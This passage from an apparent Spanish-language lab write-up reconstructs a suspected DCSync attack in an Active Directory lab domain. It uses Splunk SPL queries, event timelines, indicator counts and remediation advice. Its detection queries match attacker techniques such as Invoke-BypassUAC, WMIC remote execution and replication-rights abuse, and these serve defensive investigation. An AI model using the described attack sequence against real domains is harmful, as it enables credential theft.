La secuencia es relevante para reconstruir el posible movimiento lateral anterior a DCSync. Sin embargo, la evidencia disponible no permite demostrar que `Analytics.exe` ejecutara directamente DCSync, que las comunicaciones HTTP fueran maliciosas o que se produjera una extracción exitosa de credenciales.

## 12. Cronología final del incidente y evaluación de impacto

**Objetivo:** Reconstruir cronológicamente la actividad sospechosa, identificar los sistemas y cuentas involucrados y evaluar el alcance del posible ataque DCSync a partir de las evidencias obtenidas en Splunk.

### 12.1 Cronología de los acontecimientos

**Consulta SPL**

```spl
index="windows" (sourcetype="wineventlog:security" OR sourcetype="wineventlog:sysmon")
| eval finding=case(
    EventCode=4662 AND like(_raw,"%management%"), "AD Replication Access",
    EventCode=4648 AND like(_raw,"%management%"), "Explicit Credentials",
    EventCode=4624 AND Logon_Type=9 AND lower(Logon_Process)="seclogo", "NewCredentials",
    EventCode=4672 AND like(_raw,"%management%"), "Privileged Logon",
    EventCode=4634 AND like(_raw,"%management%"), "Session Logoff",
    EventCode=1 AND like(lower(CommandLine),"%invoke-bypassuac%"), "UAC Bypass Attempt",
    EventCode=1 AND like(lower(Image),"%analytics.exe"), "Analytics Execution",
    EventCode=3 AND SourceIp="10.0.0.216" AND DestinationIp="10.0.0.249" AND ProcessId=4544, "LDAP/RPC Communication",
    EventCode=3 AND SourceIp="10.0.0.216" AND ProcessId=4544 AND DestinationPort=443, "PowerShell HTTPS",
    true(), null()
)
| where isnotnull(finding)
| table _time host EventCode finding User Account_Name Image SourceIp DestinationIp DestinationPort
| sort 0 _time
```

La captura muestra parte de la cronología hasta el 11 de septiembre de 2023 a las 18:32:36. Los acontecimientos posteriores se encuentran documentados en las secciones anteriores.

**Análisis técnico**

|Fecha y hora (2023)|Host|Hallazgo|
|---|---|---|
|09-10 20:05:27|`DESKTOP-762OF3B`|`john` ejecuta `E:\analytics.exe`.|
|09-10 21:07:19|`DESKTOP-CFRVBBO`|`sallym` ejecuta el mismo binario.|
|09-11 18:08:41|`DESKTOP-CFRVBBO`|PowerShell intenta ejecutar `Invoke-BypassUAC.ps1` (§9).|
|09-11 18:16:10|`DESKTOP-CFRVBBO`|Evento 4648: uso explícito de credenciales de `management` (§5).|
|09-11 18:32:35|`DESKTOP-CFRVBBO`|`WMIC.exe` solicita ejecutar `Analytics.exe` en `10.0.0.216` (§11.3).|
|09-11 18:32:36|`WIN-HIDUIPTH344`|`Analytics.exe` se inicia bajo `management`, con `WmiPrvSE.exe` como padre.|
|09-11 18:41:36|`WIN-HIDUIPTH344`|Sesión `NewCredentials` de `management` mediante `Advapi`, creada por el PID `2656` (§10).|
|09-11 18:42:11|`WIN-HIDUIPTH344`|Segunda sesión `NewCredentials` mediante `seclogo`, con privilegios especiales.|
|09-11 18:42:16|`WIN-HIDUIPTH344`|Cierre de la segunda sesión (5 segundos).|
|09-11 18:50:48|`WIN-HIDUIPTH344`|PowerShell PID `4544`: conexión HTTPS hacia `185.199.111.133:443` (§6).|
|09-11 18:50:55|`WIN-HIDUIPTH344`|Evento 4648: uso de credenciales de `management` contra LDAP del DC (§5).|
|09-11 18:50:56–18:50:57|`WIN-HIDUIPTH344`|PID `4544`: conexiones LDAP/RPC hacia `10.0.0.249` (§7).|
|09-11 18:50:56–18:52:31|`WIN-HHSGPJM30S2`|32 eventos 4662 asociados a derechos de replicación de `management` (§1–4).|
|09-13 17:49:03 y 17:50:38|`WIN-HIDUIPTH344`|Dos nuevas ejecuciones de `Analytics.exe` como `SYSTEM` (§11).|

**Análisis de la secuencia**

La evidencia permite reconstruir cuatro fases:

1. **Actividad inicial observada:** `Analytics.exe` se ejecuta en dos estaciones de trabajo.
2. **Autenticación y ejecución remota:** se registra un intento de bypass de UAC, uso explícito de credenciales de `management` y lanzamiento remoto de `Analytics.exe` mediante WMI.
3. **Sesiones alternativas:** se crean sesiones `NewCredentials` asociadas a la sesión desde la que se ejecutó `Analytics.exe`.
4. **Posible DCSync:** PowerShell utiliza credenciales de `management` contra el DC y se registran conexiones LDAP/RPC coincidentes con accesos a derechos de replicación.

**Conclusión:** La cronología respalda una secuencia de actividad sospechosa que culmina en operaciones compatibles con DCSync. No demuestra que cada fase haya provocado la siguiente ni que se completara la extracción de credenciales.

### 12.2 Sistemas involucrados y alcance

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1 "analytics.exe"
| stats count as events
    values(Image) as executables
    values(User) as users
    min(_time) as first_seen
    max(_time) as last_seen
    by host
| convert ctime(first_seen) ctime(last_seen)
| sort -events
```

**Análisis técnico**

La búsqueda identifica tres sistemas con eventos Sysmon relacionados con `Analytics.exe`. El controlador de dominio se incorpora al alcance por los eventos Security 4662 analizados previamente.

|Host|Evidencia principal|Evaluación|
|---|---|---|
|`DESKTOP-762OF3B`|`john` ejecutó `Analytics.exe`.|Actividad sospechosa|
|`DESKTOP-CFRVBBO`|`sallym` ejecutó `Analytics.exe`, intentó un bypass de UAC y utilizó WMI.|Actividad sospechosa|
|`WIN-HIDUIPTH344`|Ejecución remota de `Analytics.exe`, sesiones alternativas y conexiones LDAP/RPC.|Origen probable de DCSync|
|`WIN-HHSGPJM30S2`|Eventos 4662 con derechos de replicación ejercidos por `management`.|Controlador de dominio involucrado|

**Detalle de ejecuciones**

|Host|Ejecuciones de `Analytics.exe`|Otros registros relacionados|
|---|---|---|
|`DESKTOP-762OF3B`|1|4 procesos hijos|
|`DESKTOP-CFRVBBO`|4|1 ejecución de `WMIC.exe`|
|`WIN-HIDUIPTH344`|3|1 registro de PowerShell que menciona el ejecutable|

Se identificaron **8 ejecuciones de** `Analytics.exe` **en tres sistemas**, además de actividad de replicación en el controlador de dominio.

**Conclusión:** Cuatro sistemas presentan evidencias relevantes para la investigación. Su participación está documentada, pero no todos pueden clasificarse como comprometidos de forma definitiva.

### 12.3 Cuantificación de indicadores

**Consulta SPL**

```spl
index="windows" (sourcetype="wineventlog:security" OR sourcetype="wineventlog:sysmon")
| eval finding=case(
    EventCode=4662 AND like(_raw,"%management%"), "AD Replication Access",
    EventCode=4648 AND like(_raw,"%management%"), "Explicit Credential Usage",
    EventCode=4624 AND Logon_Type=9 AND lower(Logon_Process)="seclogo", "NewCredentials Logon",
    EventCode=1 AND like(lower(Image),"%analytics.exe"), "Analytics Execution",
    EventCode=1 AND like(lower(CommandLine),"%invoke-bypassuac%"), "UAC Bypass Attempt",
    true(), null()
)
| where isnotnull(finding)
| stats count as events dc(host) as affected_hosts values(host) as hosts by finding
| sort -events
```

**Análisis técnico**

|Indicador|Eventos|Hosts|
|---|---|---|
|Accesos relacionados con replicación AD|32|1|
|Uso explícito de credenciales|15|2|
|Sesiones NewCredentials (`seclogo`)|15|2|
|Ejecuciones de `Analytics.exe`|8|3|
|Intentos identificados de bypass de UAC|1|1|

**Interpretación**

- **32 eventos 4662:** corresponden a accesos de `management` con derechos de replicación sobre el objeto de dominio.
- **15 eventos 4648:** uso explícito de credenciales de `management` en dos hosts.
- **15 eventos NewCredentials:** incluyen actividad de cuentas de máquina, `sallym` y `management`. El recuento excluye el inicio `Advapi` documentado en §10.
- **8 ejecuciones de** `**Analytics.exe**`**:** identificadas en tres sistemas, con un mismo MD5 registrado.
- **1 intento de bypass de UAC:** confirmado por la línea de comandos de PowerShell.

Estos recuentos cuantifican eventos e indicadores observados, **no el número de compromisos exitosos**.

### 12.4 Conclusión final de la investigación

**Hallazgos confirmados**

|Categoría|Evidencia|
|---|---|
|Derechos de replicación|`management` ejerció derechos `DS-Replication-Get-Changes`, `Get-Changes-All` y `Get-Changes-In-Filtered-Set`.|
|Credenciales explícitas|Eventos 4648 de uso de credenciales de `management`.|
|Ejecución remota|`WMIC.exe` inició `Analytics.exe` en `WIN-HIDUIPTH344` mediante WMI.|
|Binario común|`Analytics.exe` presentó el mismo MD5 en tres hosts.|
|Autenticación|Sesiones `NewCredentials` asociadas a `management`.|
|Bypass de UAC|Ejecución de una línea de comandos orientada a intentar el bypass.|
|Comunicación|Conexiones LDAP/RPC desde `10.0.0.216` hacia el DC durante la ventana de replicación.|

**Indicadores sospechosos**

|Indicador|Interpretación|
|---|---|
|PowerShell PID `4544`|Fuerte correlación temporal con el uso de credenciales y los eventos 4662.|
|Sesiones NewCredentials|Posible uso de credenciales alternativas; mecanismo exacto sin confirmar.|
|`Analytics.exe`|Presencia en varios hosts y ejecución remota mediante WMI.|
|Tráfico hacia `10.0.0.142:80`|Comunicaciones HTTP repetidas desde las tres copias del ejecutable.|
|Ejecuciones bajo `SYSTEM`|Actividad posterior del mismo binario con privilegios elevados de sistema.|

**Actividad no demostrada**

|Hipótesis|Estado|
|---|---|
|Extracción exitosa de hashes mediante DCSync|No demostrado|
|Pass-the-Hash|No demostrado|
|Bypass de UAC exitoso|No demostrado|
|Exfiltración de información|No demostrado|
|`10.0.0.142` como servidor C2|No demostrado|
|Método de acceso inicial|No identificado|
|Compromiso no autorizado de todos los hosts involucrados|No demostrado|

**Evaluación final**

La investigación identificó actividad compatible con **DCSync (MITRE ATT&CK T1003.006)** en el dominio `htbdefense.local`.
El origen más probable es `WIN-HIDUIPTH344` (`10.0.0.216`), desde donde se utilizaron credenciales de `management` contra el controlador de dominio `WIN-HHSGPJM30S2` (`10.0.0.249`).
La correlación entre el evento 4648, las conexiones LDAP/RPC y los eventos 4662 proporciona evidencia sólida de una posible operación de replicación del directorio desde ese sistema.
La investigación también confirmó la ejecución remota de `Analytics.exe` mediante WMI desde `DESKTOP-CFRVBBO`, así como la presencia del mismo binario en tres sistemas.
**Nivel de confianza:** Alto para la identificación del origen probable de la actividad de replicación. Insuficiente para confirmar extracción exitosa de credenciales.

Las conclusiones se fundamentan en los eventos examinados en Splunk, diferenciando los hechos confirmados de las hipótesis no demostradas.

## Respuesta y remediación propuestas

Estas acciones son recomendaciones derivadas del análisis; no se presentan como ejecutadas en el laboratorio.

- Preservar eventos 4662, 4648, 4624 y Sysmon de los sistemas implicados con una ventana temporal común.
- Validar si la cuenta de interés requiere derechos de replicación; retirar permisos indebidos y revisar las ACL del dominio.
- Contener el host de origen probable, revisar Analytics.exe y su distribución por WMI antes de atribuir C2 o exfiltración.
- Revisar sesiones con credenciales alternativas y rotar material expuesto según el alcance que pueda verificarse.
- Repetir la correlación tras la contención; una caída del recuento no basta para descartar persistencia.

## Lecturas relacionadas

- [DCSync: contexto de la técnica](/active-directory/dcsync)
- [Active Directory Attack Paths: delegación y replicación en un recorrido de laboratorio](/labs/gcb-lab)
